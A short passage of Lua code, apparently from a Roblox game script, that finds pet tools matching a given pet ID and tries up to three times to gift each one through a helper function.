            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
                print("Gifting:", tool.Name)
                for attempt = 1, 3 do
                    result = safeGiftTool(tool)
                    if result then
                        break
                    end
                end       
            end
        end
    end
